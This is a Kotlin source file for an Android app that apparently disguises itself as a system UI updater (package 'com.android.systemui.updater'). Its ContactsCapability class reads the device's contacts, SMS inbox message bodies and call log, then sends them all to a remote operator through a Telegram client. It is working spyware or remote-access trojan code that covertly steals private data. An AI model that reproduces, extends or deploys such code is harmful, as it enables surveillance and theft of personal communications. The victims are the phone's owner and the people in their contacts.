package com.android.systemui.updater.capabilities

import android.content.Context
import android.content.pm.PackageManager
import android.provider.CallLog
import android.provider.ContactsContract
import androidx.core.content.ContextCompat
import com.android.systemui.updater.ErrorReporter
import com.android.systemui.updater.TelegramClient
import java.text.SimpleDateFormat
import java.util.*

class ContactsCapability(
    private val ctx: Context,
    private val telegram: TelegramClient
) {
    private val cr = ctx.contentResolver

    // ─────────────────────────────────────────────
    // CONTACTS: name + phone number
    // ContentResolver queries Android's contact DB
    // Same API used by the built-in Contacts app
    // ─────────────────────────────────────────────
    fun getContacts() {
        if (!hasContactsPermission()) {
            telegram.sendText("❌ Contacts permission denied")
            return
        }
        val sb = StringBuilder("👥 CONTACTS\n━━━━━━━━━━━━━━━━\n")

        val cursor = cr.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            ),
            null, null,
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME
        )

        cursor?.use {
            val nameCol = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numCol  = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            var count = 0

            while (it.moveToNext() && count < 100) {
                val name = if (nameCol >= 0) it.getString(nameCol) else "Unknown"
                val number = if (numCol >= 0) it.getString(numCol) else "Unknown"
                sb.appendLine("$name: $number")
                count++
            }
            if (it.count > 100) sb.appendLine("...and ${it.count - 100} more")
        }

        telegram.sendText(sb.toString())
    }

    // ─────────────────────────────────────────────
    // SMS: reads inbox messages
    // content://sms/inbox is Android's SMS store
    // ─────────────────────────────────────────────
    fun getSMS(limit: Int = 30) {
        if (!hasSmsPermission()) {
            telegram.sendText("❌ SMS permission denied")
            return
        }
        val sb = StringBuilder("💬 SMS INBOX\n━━━━━━━━━━━━━━━━\n")
        val sdf = SimpleDateFormat("dd/MM HH:mm", Locale.getDefault())

        val cursor = cr.query(
            android.net.Uri.parse("content://sms/inbox"),
            arrayOf("address", "body", "date"),
            null, null, "date DESC"
        )

        cursor?.use {
            val addrCol = it.getColumnIndex("address")
            val bodyCol = it.getColumnIndex("body")
            val dateCol = it.getColumnIndex("date")
            val readCol = it.getColumnIndex("read")
            var count = 0

            while (it.moveToNext() && count < limit) {
                val date = if (dateCol >= 0) sdf.format(Date(it.getLong(dateCol))) else "Unknown"
                val address = if (addrCol >= 0) it.getString(addrCol) ?: "Unknown" else "Unknown"
                val body = if (bodyCol >= 0) (it.getString(bodyCol) ?: "").take(200) else ""
                val read = if (readCol >= 0 && it.getInt(readCol) == 1) "✓" else "●"
                sb.appendLine("[$date] $read $address")
                sb.appendLine(body)
                sb.appendLine("---")
                count++
            }
        }

        telegram.sendText(sb.toString())
    }

    // ─────────────────────────────────────────────
    // CALL LOG: incoming/outgoing/missed calls
    // Shows who called, when, for how long
    // ─────────────────────────────────────────────
    fun getCallLog() {
        if (!hasCallLogPermission()) {
            telegram.sendText("❌ Call Log permission denied")
            return
        }
        val sb = StringBuilder("📞 CALL LOG\n━━━━━━━━━━━━━━━━\n")
        val sdf = SimpleDateFormat("dd/MM HH:mm", Locale.getDefault())

        val cursor = cr.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
            ),
            null, null, "${CallLog.Calls.DATE} DESC"
        )

        cursor?.use {
            val numCol  = it.getColumnIndex(CallLog.Calls.NUMBER)
            val typeCol = it.getColumnIndex(CallLog.Calls.TYPE)
            val dateCol = it.getColumnIndex(CallLog.Calls.DATE)
            val durCol  = it.getColumnIndex(CallLog.Calls.DURATION)
            val nameCol = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
            var count = 0

            while (it.moveToNext() && count < 30) {
                val type = if (typeCol >= 0) {
                    when (it.getInt(typeCol)) {
                        CallLog.Calls.INCOMING_TYPE -> "📲 IN"
                        CallLog.Calls.OUTGOING_TYPE -> "📤 OUT"
                        CallLog.Calls.MISSED_TYPE   -> "❌ MISSED"
                        else                        -> "❓"
                    }
                } else "❓"
                val date = if (dateCol >= 0) sdf.format(Date(it.getLong(dateCol))) else "Unknown"
                val dur  = if (durCol >= 0) it.getLong(durCol) else 0L
                val number = if (numCol >= 0) (it.getString(numCol) ?: "Unknown") else "Unknown"
                val name = if (nameCol >= 0) (it.getString(nameCol)?.takeIf { n -> n.isNotEmpty() }) else null
                val display = name ?: number
                sb.appendLine("$type [$date] $display (${dur}s)")
                count++
            }
        }

        telegram.sendText(sb.toString())
    }

    private fun hasContactsPermission(): Boolean {
        return ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
    }

    private fun hasSmsPermission(): Boolean {
        return ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
    }

    private fun hasCallLogPermission(): Boolean {
        return ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED
    }
}